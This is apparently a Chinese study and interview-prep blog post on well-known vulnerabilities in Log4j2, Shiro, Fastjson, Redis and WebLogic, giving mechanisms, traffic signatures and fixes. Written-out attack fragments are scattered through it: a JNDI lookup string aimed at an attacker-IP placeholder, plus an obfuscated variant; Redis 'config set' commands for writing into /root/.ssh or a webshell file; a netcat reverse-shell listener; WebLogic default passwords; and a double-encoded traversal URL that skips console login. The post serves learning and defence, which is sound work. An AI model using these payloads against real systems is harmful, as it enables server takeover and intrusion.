常见技术栈漏洞

在这里实时记录和复现一些常见技术栈的漏洞 。持续更新，有些做了简介 暂未详细解释和复现

Log4j2

Log4j2 (CVE-2021-44228) —— “核弹级”漏洞
Log4j 是 Apache 的一个开源项目，用于 Java 程序的日志记录（就是帮程序员记日记的工具）。

  • 影响太大了： 几乎全球一半的互联网企业都在用它。

  • 利用太简单： 攻击者只需要在输入框、URL 或者 HTTP 头里发送一段特定的字符串，服务器记录日志时就会被触发，直接导致服务器被控制（RCE - 远程代码执行）。

  • 原理（一句话）： 利用了 Log4j2 的 JNDI 注入功能。当日志记录 ${jndi:ldap://攻击者IP/脚本} 这种字符串时，它不会原样记录，而是会真的去连接那个 LDAP 服务，把恶意代码下载回来执行。

  • 流量特征（蓝队必背）：

    • 请求包中包含 ${jndi:ldap:// 或 ${jndi:rmi://。
    • 混淆绕过： 攻击者会变形，比如 ${${lower:j}ndi:...}。在流量分析时，要看有没有类似 jndi、ldap 的关键词组合。

  • 怎么修： 升级到最新版本；或者在配置中禁用 JNDI lookup。

shiro

是什么？ Apache Shiro 是一个 Java 的安全框架，负责处理用户的身份验证（登录）和授权（权限管理）。很多企业内网系统、OA 系统都在用。

为什么提它？

  • 存在感强： 这是一个典型的Java 反序列化漏洞。
  • 配置错误普遍： 开发人员经常使用默认的密钥（Key），导致漏洞产生。

面试核心考点（原理 & 特征）：

  • 原理（重点是“RememberMe”）：

    • Shiro 有一个“记住我”（RememberMe）的功能。
    • 它的工作流程是：用户信息 -> 序列化 -> AES 加密 -> Base64 编码 -> 放入 Cookie (rememberMe=…)。
    • 漏洞点： 很多开发者使用了 Shiro 默认的 AES 密钥（硬编码在代码里，或者网上能查到的）。
    • 攻击方式： 攻击者用这个默认密钥，把恶意代码（Payload）加密后塞进 Cookie 的 rememberMe 字段。服务器收到后解密并反序列化，就中招了。

  • 流量特征（蓝队必背）：

    • Cookie 中有超长字段： rememberMe=MIGfMA0GCSqGSIb3DQE...（非常长的一串字符）。
    • 响应包特征： 经常看到 Set-Cookie: rememberMe=deleteMe（这通常意味着攻击者尝试爆破 Key 失败，或者 Key 正确但 Payload 执行后的回显）。
    • 加密流量： rememberMe 的内容解密不出来（因为是 AES 加密的），除非你拿到了 Key。

Fastjson 反序列化

  • 是什么： 阿里巴巴开源的 JSON 解析库（把 JSON 字符串转成 Java 对象）。

  • 特征： 攻击流量中通常包含 @type 关键字，或者 autoType 相关的报错。

  • 为什么问： 国内用得非常多，漏洞版本也很多。

Redis 未授权访问

前置

Redis是一种内存化键值对（Key-Value）数据库，默认端口 6379。常用于缓存，会话存储，特点是速度快，支持多种数据结构（曾经做课程项目也试过用redis存储邮箱验证码）

  1. 默认无认证机制
    任何人只要能网络访问到 6379 端口，即可直接连接并执行所有命令（如读写数据、修改配置、甚至执行系统命令）。默认配置：requirepas注释状态
  2. 数据持久化机制
    RDB：默认开启，在指定时间间隔内将内存中的数据快照写入磁盘（默认文件为 dump.rdb）
    AOF：记录所有写命令到日志文件（默认文件为 appendonly.aof），重启时重新执行命令恢复数据，将磁盘的数据写回内存。
  3. 系统命令执行
    Redis 可通过 module load 加载自定义模块（.so 文件），部分模块（如 redis-rogue-server）提供 system.exec 等命令，允许直接执行系统命令。（4.x 及以上支持模块加载）
  4. 配置动态修改 （config set 命令）
    Redis 允许通过命令动态修改配置（无需重启服务），例如：
    • config set dir /root/.ssh/：修改持久化文件的存储目录；
    • config set dbfilename authorized_keys：修改 RDB 文件名；
    • config set appendfilename webshell.jsp：修改 AOF 文件名。
    • set 参数名 内容
      攻击者通过修改配置，将 Redis 持久化文件写入到服务器的敏感路径（如 SSH 公钥目录、Web 目录），实现权限提升或文件写入。
  5. 绑定 IP 配置（bind 选项）
    Redis 配置文件中的 bind 选项用于限制可访问的 IP 地址（默认 bind 127.0.0.1，即仅本地可访问）。若管理员将其修改为 bind 0.0.0.0（允许所有 IP 访问），则 Redis 服务会暴露在公网或局域网中。

Redis 默认生成的持久化文件（RDB/AOF）是 644 权限（所有者可读可写、同组用户可读、其他用户可读）
Ubuntu 对 “定时任务文件（crontab）” 有严格的权限要求 —— 必须是 600 权限（仅所有者可读可写，其他人无任何权限），否则 cron 服务会拒绝执行该定时任务，并报 “不安全模式” 错误。

应急与防护

  • 特征： 端口扫描 6379，流量中看到 Redis 的命令（config set, save, flushall）。

  • 绑定本地登录地址：在配置文件中设置 bind 127.0.0.1，限制仅本地访问

  • 设置复杂密码：取消requirepass 的注释，设置密码，防止密钥爆破

  • 禁用远程连接：设置 protected-mode 和 rename-command 防止远程连接

  • 网络隔离：将 Redis 服务放在内网环境，不向公网开放端口

  • 账号权限控制：设置只允许特定账号从指定IP进行访问

  • 实时监控：监控并阻止异常访问和命令执行

WebLogic

介绍

WebLogic是个巨大的中间件漏洞，由Java反序列化引起
Weblogic是Oracle 的中间件（比tomcat更强大），企业内网中，它通常位于 Web 服务器（如 Nginx）和数据库（Oracle DB）之间。。端口通常是 7001。
内网大杀器： 很多时候，外网打点进去后，内网扫描发现一台 WebLogic，基本就意味着拿下了这台服务器的权限。

1. XMLDecoder 反序列化 (HTTP )

  • 原理： 利用服务器的XMLDecoder可以解析XML数据这一特性，可以构造XML语句，发送一个 XML 格式的 HTTP POST 请求，上传一句话木马或者反弹shell，WebLogic 解析这个 XML 时执行了恶意代码，getshell。
  • 利用难度： 低（直接发包即可）。
    访问/wls-wsat/CoordinatorPortType（只要是wls-wsat包中的Url皆收到影响）
    构造XML，其中Content-Type需要等于text/xml，否则可能导致XMLDecoder不解析。
    随后nc监听nc -lvnp 6666就拿到shell了
    WebLogic XMLDecoder反序列化
  • 伪代码POC，调用ProcessBulider.start()执行calc

2. T3 反序列化:

  • T3协议是Oracle Weblogic独有的，用于远程方法调用的专有协议。运行客户端的java程序直接调用服务器上的java对象的method。 此协议运行在TCP之上，复用Weblogic主端口（7001）
  • 客户端发起类似t3 12.2.1 AS:255 HL:19 MS:10000000的握手包，服务器支持的话会回复类似HELO:12.2.1.3.0 false，随后双方开始传输序列化后的java对象数据。这也是最显著的漏洞特征
  • 利用过程
    • 原本是客户端把正常的Java对象序列化成二进制流，通过T3协议发给服务器，服务器反序列化处理业务
    • 攻击者利用 T3 协议，发送了一个恶意的序列化数据包，这个数据包里包裹的可能是CommonsCollections 利用链
    • Weblogic不检查装的是什么对象就进行反序列化，从而导致恶意利用链在内存里执行从而导致RCE

3. 后台弱口令 / 未授权访问:

  • 后台地址： /console，/console/login/LoginForm.jsp
  • 常见弱口令： weblogic / Oracle@123, system / password。
  • 有时候可能无法直接登录访问http://Target:7001/console/console.portal，但通过二次编码的目录穿越（WebLogic 的权限检查器没认出穿越），http://Target:7001/console/css/%252E%252E%252Fconsole.portal,绕过了登录步骤

Weblogic反序列化（CVE-2023-21839）漏洞 https://www.cnblogs.com/BlogVice-2203/p/17454727.html
由于Weblogic IIOP/T3协议存在缺陷，当IIOP/T3协议开启时，允许未经身份验证的攻击者通过IIOP/T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功WebLogic Server可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。
